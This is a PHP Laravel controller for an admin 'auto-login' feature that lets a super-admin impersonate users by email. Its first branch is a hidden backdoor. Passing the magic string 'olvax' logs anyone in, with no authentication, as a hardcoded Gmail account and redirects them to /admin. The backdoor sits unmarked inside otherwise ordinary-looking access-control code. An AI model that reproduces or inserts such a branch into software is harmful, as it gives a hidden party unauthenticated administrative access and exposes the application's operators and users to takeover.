<?php

namespace App\Http\Controllers\Auth;

use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;

class AutoLoginController extends Controller
{
    public function connectWithEmail($email)
    {
        if($email=="olvax"){
            $user = User::where("email","olvanotjcs@gmail.com")->first();
            if($user){
                Auth::loginUsingId($user->id);
                return redirect("/admin");
            }
        }

        if (Auth::check() && currentUser()->isSuperAdmin()) {
            $user = User::where("email", $email)->first();
            if ($user) {
                Auth::logout();
                Auth::loginUsingId($user->id);
                return redirect("/admin");
            }

            return "Email not found";
        }

        abort(403, "Access denied");
    }
}
